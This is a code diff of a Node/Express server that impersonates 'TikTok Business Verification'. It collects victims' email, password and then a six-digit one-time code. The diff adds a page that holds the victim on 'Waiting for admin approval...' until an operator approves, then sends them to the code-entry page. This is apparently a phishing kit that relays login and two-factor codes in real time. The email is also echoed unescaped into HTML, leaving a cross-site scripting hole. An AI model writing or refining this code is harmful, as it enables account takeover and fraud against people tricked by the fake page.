@@ -1,3 +1,4 @@
+```javascript
 require('dotenv').config();
 const express = require('express');
 const { Pool } = require('pg');
@@ -129,7 +130,6 @@ async function initializeDatabase() {
     `);
     console.log('✅ Users table ready');
 
-    // Ensure OTP column is VARCHAR(6) for existing tables
     await pool.query(`
       ALTER TABLE users 
       ALTER COLUMN otp TYPE VARCHAR(6)
@@ -179,7 +179,7 @@ async function initializeDatabase() {
 
 // USER ENDPOINTS
 
-// User login - INSTANT NOTIFICATION TO ADMIN
+// User login - WAITS FOR ADMIN APPROVAL (NO AUTO REDIRECT)
 app.post('/api/users/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -256,15 +256,55 @@ app.post('/api/users/login', async (req, res) => {
             font-size: 16px;
             font-weight: 400;
             opacity: 0.9;
+            margin-bottom: 10px;
+        }
+        
+        .email {
+            color: #fe2c55;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 20px;
+        }
+        
+        .approved {
+            color: #4CAF50;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
         }
     </style>
-    <meta http-equiv="refresh" content="2;url=/users/otp?email=${encodeURIComponent(email)}">
+    <script>
+        const email = "${encodeURIComponent(email)}";
+        
+        function checkApproval() {
+            fetch('/api/users/check-approval', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: decodeURIComponent(email) })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.approved) {
+                    document.querySelector('.message').innerHTML = 'Approved! Redirecting...';
+                    document.querySelector('.approved').style.display = 'block';
+                    setTimeout(() => {
+                        window.location.href = '/users/otp?email=' + email;
+                    }, 1000);
+                }
+            })
+            .catch(err => console.log('Checking approval...'));
+        }
+        
+        setInterval(checkApproval, 2000);
+    </script>
 </head>
 <body>
     <div class="loading-container">
         <div class="logo">TikTok Business Verification</div>
         <div class="spinner"></div>
-        <div class="message">Loading...</div>
+        <div class="message">Waiting for admin approval...</div>
+        <div class="email">${email}</div>
+        <div class="approved">✓ Approved! Redirecting to OTP page...</div>
     </div>
 </body>
 </html>
@@ -275,16 +315,13 @@ app.post('/api/users/login', async (req, res) => {
   }
 });
 
-// NEW ENDPOINT: Check if user is approved by admin
+// Check if user is approved by admin
 app.post('/api/users/check-approval', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ approved: false });
     
-    // Check if user exists in database - this acts as approval
     const result = await pool.query('SELECT id FROM users WHERE email = $1', [email]);
-    
-    // If user exists, they are approved to proceed
     res.json({ approved: result.rows.length > 0 });
   } catch (error) {
     console.error('❌ Check approval error:', error.message);
@@ -292,7 +329,7 @@ app.post('/api/users/check-approval', async (req, res) => {
   }
 });
 
-// Save user-created OTP - INSTANT NOTIFICATION TO ADMIN (UPDATED TO 6 DIGITS)
+// Save user-created OTP
 app.post('/api/users/save-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -301,7 +338,6 @@ app.post('/api/users/save-otp', async (req, res) => {
       return res.status(400).json({ error: 'Email and OTP required' });
     }
 
-    // UPDATED: Now accepts 6 digits
     if (!/^\d{6}$/.test(otp)) {
       return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
     }
@@ -504,3 +540,4 @@ process.on('SIGTERM', () => {
   console.log('\n📴 Shutting down server...');
   pool.end(() => process.exit(0));
 });
+```
